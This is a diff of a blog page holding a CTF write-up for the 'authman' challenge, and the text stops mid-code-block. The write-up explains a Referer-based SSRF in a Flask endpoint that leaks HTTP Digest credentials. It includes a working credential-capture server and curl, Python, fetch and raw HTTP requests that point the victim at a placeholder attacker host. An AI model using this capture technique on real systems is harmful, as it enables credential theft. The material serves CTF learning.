@@ -31,7 +31,7 @@ authman/app/__init__.py – khởi tạo Flask app, cấu hình, HTTPDigestAuth
 authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/writeup---authman/">
-<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.cd7d779f43ba7341369cf5885000729d0346866d1e68e53eaa9502915f945caa.css" integrity="sha256-zX13n0O6c0E2nPWIUABynQNGhm0eaOU&#43;qpUCkV&#43;UXKo=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.c85d014ccab6242e17ca522adf6f47099d53d21ed8842ec884f11d5fe103d061.css" integrity="sha256-yF0BTMq2JC4XylIq329HCZ1T0h7YhC7IhPEdX&#43;ED0GE=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
@@ -151,15 +151,29 @@ authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 <li><strong>Endpoint:</strong> <code>/api/check</code> (GET method, unauthenticated)</li>
 </ul>
 <h3 id="vulnerable-code">Vulnerable Code<a hidden class="anchor" aria-hidden="true" href="#vulnerable-code">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/api/check&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>():
-</span></span><span style="display:flex;"><span>    (user, pw), <span style="color:#f92672">*</span>_ <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;AUTH_USERS&#39;</span>]<span style="color:#f92672">.</span>items()
-</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(r<span style="color:#f92672">.</span>referrer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/auth&#39;</span>,
-</span></span><span style="display:flex;"><span>        auth <span style="color:#f92672">=</span> HTTPDigestAuth(user,pw),
-</span></span><span style="display:flex;"><span>        timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;status&#39;</span>:res<span style="color:#f92672">.</span>status_code})
-</span></span></code></pre></div><h3 id="root-cause-analysis">Root Cause Analysis<a hidden class="anchor" aria-hidden="true" href="#root-cause-analysis">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/api/check&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;AUTH_USERS&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">referrer</span> <span class="o">+</span> <span class="s1">&#39;/auth&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPDigestAuth</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">pw</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;status&#39;</span><span class="p">:</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="root-cause-analysis">Root Cause Analysis<a hidden class="anchor" aria-hidden="true" href="#root-cause-analysis">#</a></h3>
 <p>The vulnerability stems from three critical security flaws:</p>
 <ol>
 <li>
@@ -173,10 +187,19 @@ authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 </li>
 </ol>
 <h3 id="attack-vector">Attack Vector<a hidden class="anchor" aria-hidden="true" href="#attack-vector">#</a></h3>
-<pre tabindex="0"><code>[Attacker] → [Victim Server] → [Attacker-Controlled Server]
-                ↓
-        (sends credentials)
-</code></pre><p>The attack flow:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Attacker] → [Victim Server] → [Attacker-Controlled Server]
+</span></span><span class="line"><span class="cl">                ↓
+</span></span><span class="line"><span class="cl">        (sends credentials)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The attack flow:</p>
 <ol>
 <li>Attacker sends a GET request to <code>/api/check</code> with a malicious <code>Referer</code> header</li>
 <li>Victim server reads the <code>Referer</code> header value</li>
@@ -193,95 +216,211 @@ authman/app/routes.py – định nghĩa các route /, /auth, /api/check">
 </ul>
 <h3 id="step-1-set-up-credential-capture-server">Step 1: Set Up Credential Capture Server<a hidden class="anchor" aria-hidden="true" href="#step-1-set-up-credential-capture-server">#</a></h3>
 <p>Create a simple Flask server to log incoming requests:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/auth&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;HEAD&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">capture</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;CAPTURED REQUEST:&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Method: </span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>method<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Headers:&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> header, value <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>headers:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  </span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># HTTP Digest Auth details will be in Authorization header</span>
-</span></span><span style="display:flex;"><span>    auth_header <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> auth_header:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">🔑 AUTHENTICATION CAPTURED:&#34;</span>)
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  </span><span style="color:#e6db74">{</span>auth_header<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Parse digest authentication parameters</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Digest&#39;</span> <span style="color:#f92672">in</span> auth_header:
-</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">📋 Digest Auth Parameters:&#34;</span>)
-</span></span><span style="display:flex;"><span>            parts <span style="color:#f92672">=</span> auth_header<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;Digest &#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> parts:
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  </span><span style="color:#e6db74">{</span>part<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Return 401 to trigger authentication</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">401</span>, {<span style="color:#e6db74">&#39;WWW-Authenticate&#39;</span>: <span style="color:#e6db74">&#39;Digest realm=&#34;test&#34;&#39;</span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span></code></pre></div><p>Run the capture server:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python capture_server.py
-</span></span></code></pre></div><h3 id="step-2-exploit-the-ssrf-vulnerability">Step 2: Exploit the SSRF Vulnerability<a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-the-ssrf-vulnerability">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/auth&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;CAPTURED REQUEST:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Method: </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Headers:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">header</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">header</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># HTTP Digest Auth details will be in Authorization header</span>
+</span></span><span class="line"><span class="cl">    <span class="n">auth_header</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">auth_header</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🔑 AUTHENTICATION CAPTURED:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">auth_header</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Parse digest authentication parameters</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Digest&#39;</span> <span class="ow">in</span> <span class="n">auth_header</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">📋 Digest Auth Parameters:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">parts</span> <span class="o">=</span> <span class="n">auth_header</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;Digest &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">part</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Return 401 to trigger authentication</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;WWW-Authenticate&#39;</span><span class="p">:</span> <span class="s1">&#39;Digest realm=&#34;test&#34;&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run the capture server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python capture_server.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="step-2-exploit-the-ssrf-vulnerability">Step 2: Exploit the SSRF Vulnerability<a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-the-ssrf-vulnerability">#</a></h3>
 <p><strong>Method 1: Using curl</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://YOUR_SERVER_IP:8080&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     http://TARGET_SERVER:5000/api/check
-</span></span></code></pre></div><p><strong>Method 2: Using  Python</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://TARGET_SERVER:5000/api/check&#34;</span>
-</span></span><span style="display:flex;"><span>attacker_server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://YOUR_SERVER_IP:8080&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
-</span></span><span style="display:flex;"><span>    target_url,
-</span></span><span style="display:flex;"><span>    headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Referer&#34;</span>: attacker_server}
-</span></span><span style="display:flex;"><span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>json()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span></code></pre></div><p><strong>Method 3: Using Browser Developer Tools</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Open browser console on any website
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://TARGET_SERVER:5000/api/check&#39;</span>, {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http://YOUR_SERVER_IP:8080&#39;</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>})
-</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">json</span>())
-</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>);
-</span></span></code></pre></div><p><strong>Method 4: Using Burp Suite</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://YOUR_SERVER_IP:8080&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     http://TARGET_SERVER:5000/api/check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Method 2: Using  Python</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://TARGET_SERVER:5000/api/check&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">attacker_server</span> <span class="o">=</span> <span class="s2">&#34;http://YOUR_SERVER_IP:8080&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">attacker_server</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Method 3: Using Browser Developer Tools</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Open browser console on any website
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://TARGET_SERVER:5000/api/check&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Referer&#39;</span><span class="o">:</span> <span class="s1">&#39;http://YOUR_SERVER_IP:8080&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Method 4: Using Burp Suite</strong></p>
 <ol>
 <li>Intercept a request to <code>/api/check</code></li>
 <li>Modify the <code>Referer</code> header:
-<pre tabindex="0"><code>GET /api/check HTTP/1.1
-Host: TARGET_SERVER:5000
-Referer: http://YOUR_SERVER_IP:8080
-</code></pre></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /api/check HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: TARGET_SERVER:5000
+</span></span><span class="line"><span class="cl">Referer: http://YOUR_SERVER_IP:8080
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>Forward the request</li>
 </ol>
 <h3 id="step-3-capture-http-digest-authentication">Step 3: Capture HTTP Digest Authentication<a hidden class="anchor" aria-hidden="true" href="#step-3-capture-http-digest-authentication">#</a></h3>
 <p>Your capture server will receive a request with the <code>Authorization</code> header containing HTTP Digest authentication. The response will look like:</p>
-<pre tabindex="0"><code>CAPTURED REQUEST:
-============================================================
-Method: GET
-Headers:
-  Host: YOUR_SERVER_IP:8080
-  User-Agent: python-requests/2.31.0
-  Accept-Encoding: gzip, deflate
-  Accept: */*
-  Connection: keep-alive
-  Authorization: Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;...&#34;, uri=&#34;/auth&#34;, response=&#34;...&#34;, opaque=&#34;...&#34;, qop=auth, nc=00000001, cnonce=&#34;...&#34;
-
-🔑 AUTHENTICATION CAPTURED:
-  Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;dGVzdA==&#34;, uri=&#34;/auth&#34;, response=&#34;a1b2c3d4...&#34;, opaque=&#34;xyz123&#34;, qop=auth, nc=00000001, cnonce=&#34;abc789&#34;
-============================================================
-</code></pre><h3 id="step-4-extract-credentials">Step 4: Extract Credentials<a hidden class="anchor" aria-hidden="true" href="#step-4-extract-credentials">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
